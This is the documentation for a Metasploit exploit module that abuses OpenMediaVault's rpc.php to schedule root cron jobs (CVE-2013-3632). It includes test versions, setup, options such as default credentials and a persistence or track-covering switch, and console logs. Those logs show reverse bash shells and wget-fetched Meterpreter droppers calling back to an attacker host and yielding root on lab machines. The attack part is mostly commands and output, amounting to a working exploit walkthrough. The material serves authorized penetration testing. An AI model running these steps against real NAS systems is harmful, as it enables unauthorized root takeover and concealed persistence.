## Vulnerable Application

This is a new module addressing an old vulnerability in OpenMediaVault, an open-source NAS solution.
The vulnerability exists within all OpenMediaVault versions starting from from `0.1` until the recent release `7.4.2-2`
and it allows an authenticated user to create cron jobs as root on the system.
An attacker can abuse this by sending a POST request via `rpc.php` to schedule and execute a cron entry
that runs arbitrary commands as root on the system.

The following releases were tested.

**OpenMediaVault x64 appliances:**
* openmediavault_0.2_amd64.iso
* openmediavault_0.2.5_amd64.iso
* openmediavault_0.3_amd64.iso
* openmediavault_0.4_amd64.iso
* openmediavault_0.4.32_amd64.iso
* openmediavault_0.5.0.24_amd64.iso
* openmediavault_0.5.48_amd64.iso
* openmediavault_1.9_amd64.iso
* openmediavault_2.0.13_amd64.iso
* openmediavault_2.1_amd64.iso
* openmediavault_3.0.2-amd64.iso
* openmediavault_3.0.26-amd64.iso
* openmediavault_3.0.74-amd64.iso
* openmediavault_4.0.9-amd64.iso
* openmediavault_4.1.3-amd64.iso
* openmediavault_5.0.5-amd64.iso
* openmediavault_5.5.11-amd64.iso
* openmediavault_5.6.13-amd64.iso
* openmediavault_6.0-16-amd64.iso
* openmediavault_6.0-34-amd64.iso
* openmediavault_6.0-amd64.iso
* openmediavault_6.0.24-amd64.iso
* openmediavault_6.5.0-amd64.iso
* openmediavault_7.0-20-amd64.iso
* openmediavault_7.0-32-amd64.iso

**ARM64 on Raspberry PI running Kali Linux 2024-3:**
* openmediavault 7.3.0-5
* openmediavault 7.4.2-2

**VirtualBox Images (x64):**
* openmediavault 0.4.24
* openmediavault 0.5.30
* openmediavault 1.0.21

## Installation steps to install OpenMediaVault NAS appliance
* Install your favorite virtualization engine (VMware or VirtualBox) on your preferred platform.
* Here are the installation instructions for [VirtualBox on MacOS](https://tecadmin.net/how-to-install-virtualbox-on-macos/).
* Download the OpenMediaVault iso images from [here](https://sourceforge.net/projects/openmediavault/files/iso/).
* Install the iso image in your virtualization engine.
* When installed, configure the VM appliance to your needs using the menu options.
* Boot up the VM and should be able to access the OpenMediaVault appliance.
* Either thru the console, `ssh` on port `22` or using the `webui` via `http://your_openmediavault_ip`.

You are now ready to test the module.

## Verification Steps
- [ ] Start `msfconsole`
- [ ] `use exploit/unix/webapp/openmediavault_auth_cron_rce`
- [ ] `set rhosts <ip-target>`
- [ ] `set rport <port>`
- [ ] `set lhost <attacker-ip>`
- [ ] `set target <0=Unix Command, 1=Linux Dropper>`
- [ ] `exploit`
- [ ] you should get a `reverse shell` or `Meterpreter` session depending on the `payload` and `target` settings

## Options

### USERNAME
This option is required and is the username (default: admin) to authenticate with the application.

### PASSWORD
This option is required and is the password (default: openmediavault) in plain text to authenticate with the application.

### PERSISTENT
This option keeps the payload persistent in Cron and runs every minute. Warning: This is a noisy option for detection.
The default value is false, where the payload is removed to cover your tracks.

## Scenarios
```msf
msf6 exploit(unix/webapp/openmediavault_auth_cron_rce) > info

       Name: OpenMediaVault rpc.php Authenticated Cron Remote Code Execution
     Module: exploit/unix/webapp/openmediavault_auth_cron_rce
   Platform: Unix, Linux
       Arch: cmd, x86, x64, armle, aarch64
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2024-05-08

Provided by:
  h00die-gr3y <h00die.gr3y@gmail.com>
  Brandon Perry <bperry.volatile@gmail.com>
  Mert BENADAM

Module side effects:
 ioc-in-logs
 artifacts-on-disk

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
  =>  0   Unix Command
      1   Linux Dropper

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  PASSWORD   openmediavault   yes       The OpenMediaVault password to authenticate with
  PERSISTENT  false           yes       Keep the payload persistent in Cron. Default value is false, where the payload is removed
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  TARGETURI  /                yes       The URI path of the OpenMediaVault web application
  URIPATH                     no        The URI to use for this exploit (default is random)
  USERNAME   admin            yes       The OpenMediaVault username to authenticate with
  VHOST                       no        HTTP server virtual host


  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to liste
                                      n on all addresses.
  SRVPORT  8080             yes       The local port to listen on.

Payload information:

Description:
  OpenMediaVault allows an authenticated user to create cron jobs as root on the system.
  An attacker can abuse this by sending a POST request via rpc.php to schedule and execute
  a cron entry that runs arbitrary commands as root on the system.
  All OpenMediaVault versions including the latest release 7.3.1-1 are vulnerable.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2013-3632
  https://packetstormsecurity.com/files/178526
  https://attackerkb.com/topics/zl1kmXbAce/cve-2013-3632


View the full module info with the info -d command.
```
### openmediavault_7.0-32-amd64.iso appliance Unix command - cmd/unix/reverse_bash
```msf
msf6 exploit(unix/webapp/openmediavault_auth_cron_rce) > set rhosts 192.168.201.6
rhosts => 192.168.201.6
msf6 exploit(unix/webapp/openmediavault_auth_cron_rce) > set lhost 192.168.201.8
lhost => 192.168.201.8
msf6 exploit(unix/webapp/openmediavault_auth_cron_rce) > check

[*] 192.168.201.6:80 - Authenticating with OpenMediaVault using credentials admin:openmediavault
[*] Trying to detect if target is running a vulnerable version of OpenMediaVault.
[+] 192.168.201.6:80 - The target is vulnerable. Version 7.0.pre.32
msf6 exploit(unix/webapp/openmediavault_auth_cron_rce) > exploit

[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] 192.168.201.6:80 - Authenticating with OpenMediaVault using credentials admin:openmediavault
[*] Trying to detect if target is running a vulnerable version of OpenMediaVault.
[+] The target is vulnerable. Version 7.0.pre.32
[*] Executing Unix Command for cmd/unix/reverse_bash
[+] Cron payload execution triggered. Wait at least 1 minute for the session to be established.
[+] Cron payload entry successfully removed.
[*] Command shell session 1 opened (192.168.201.8:4444 -> 192.168.201.6:60814) at 2024-07-03 12:47:54 +0000

id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux openmediavault 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 GNU/Linux
exit
```
### openmediavault_7.0-32-amd64.iso appliance Linux Dropper -  linux/x64/meterpreter/reverse_tcp
```msf
msf6 exploit(unix/webapp/openmediavault_auth_cron_rce) > set target 1
target => 1
msf6 exploit(unix/webapp/openmediavault_auth_cron_rce) > exploit

[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] 192.168.201.6:80 - Authenticating with OpenMediaVault using credentials admin:openmediavault
[*] Trying to detect if target is running a vulnerable version of OpenMediaVault.
[+] The target is vulnerable. Version 7.0.pre.32
[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp
[*] Using URL: http://192.168.201.8:8080/cYSPpwJI3FXafxL
[+] Cron payload execution triggered. Wait at least 1 minute for the session to be established.
[*] Command Stager progress - 100.00% done (121/121 bytes)
[*] Client 192.168.201.6 (Wget/1.21.3) requested /cYSPpwJI3FXafxL
[*] Sending payload to 192.168.201.6 (Wget/1.21.3)
[*] Sending stage (3045380 bytes) to 192.168.201.6
[+] Cron payload entry successfully removed.
[*] Meterpreter session 2 opened (192.168.201.8:4444 -> 192.168.201.6:44398) at 2024-07-03 12:53:49 +0000
[*] Server stopped.

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : openmediavault.local
OS           : Debian 12.5 (Linux 6.1.0-18-amd64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```
###  openmediavault 7.3.0-5 ARM64 Raspberry PI-4 Unix command - cmd/unix/reverse_bash
```msf
msf6 exploit(unix/webapp/openmediavault_auth_cron_rce) > set target 0
target => 0
msf6 exploit(unix/webapp/openmediavault_auth_cron_rce) > set rhosts 192.168.1.10
rhosts => 192.168.1.10
msf6 exploit(unix/webapp/openmediavault_auth_cron_rce) > set lhost 192.168.1.8
lhost => 192.168.1.8
msf6 exploit(unix/webapp/openmediavault_auth_cron_rce) > exploit

[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Authenticating with OpenMediaVault using credentials admin:openmediavault
[*] Trying to detect if target is running a vulnerable version of OpenMediaVault.
[+] The target appears to be vulnerable. Version 7.3.0.pre.5
[*] Executing Unix Command for cmd/unix/reverse_bash
[+] Cron payload execution triggered. Wait at least 1 minute for the session to be established.
[+] Cron payload entry successfully removed.
[*] Command shell session 8 opened (192.168.201.8:4444 -> 192.168.201.10:50292) at 2024-07-01 20:14:07 +0000

pwd
/root
uname -a
Linux cerberus 5.15.44-Re4son-v8l+ #1 SMP PREEMPT Debian kali-pi (2022-07-03) aarch64 GNU/Linux
```
###  openmediavault 7.3.0-5 ARM64 Raspberry PI-4  Linux Dropper -  linux/aarch64/meterpreter_reverse_tcp
```msf
msf6 exploit(unix/webapp/openmediavault_auth_cron_rce) > set target 1
target => 1
msf6 exploit(unix/webapp/openmediavault_auth_cron_rce) > set rhosts 192.168.1.10
rhosts => 192.168.1.10
msf6 exploit(unix/webapp/openmediavault_auth_cron_rce) > set lhost 192.168.1.8
lhost => 192.168.1.8
msf6 exploit(unix/webapp/openmediavault_auth_cron_rce) > exploit

msf6 exploit(unix/webapp/openmediavault_auth_cron_rce) > exploit

[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Authenticating with OpenMediaVault using credentials admin:openmediavault
[*] Trying to detect if target is running a vulnerable version of OpenMediaVault.
[+] The target appears to be vulnerable. Version 7.3.0.pre.5
[*] Executing Linux Dropper for linux/aarch64/meterpreter_reverse_tcp
[*] Using URL: http://192.168.201.8:8080/DdVzoLQugqto82
[+] Cron payload execution triggered. Wait at least 1 minute for the session to be established.
[*] Command Stager progress - 100.00% done (120/120 bytes)
[*] Client 192.168.201.10 (Wget/1.21.4) requested /DdVzoLQugqto82
[*] Sending payload to 192.168.201.10 (Wget/1.21.4)
[+] Cron payload entry successfully removed.
[*] Meterpreter session 9 opened (192.168.201.8:4444 -> 192.168.201.10:36792) at 2024-07-01 20:22:02 +0000
[*] Server stopped.

meterpreter > sysinfo
Computer     : 192.168.201.10
OS           : Debian  (Linux 5.15.44-Re4son-v8l+)
Architecture : aarch64
BuildTuple   : aarch64-linux-musl
Meterpreter  : aarch64/linux
meterpreter > getuid
Server username: root
meterpreter >
```
## Limitations
Ensure that your `WfsDelay` advanced option is set to more then 60 seconds to allow `cron` to execute the payload.
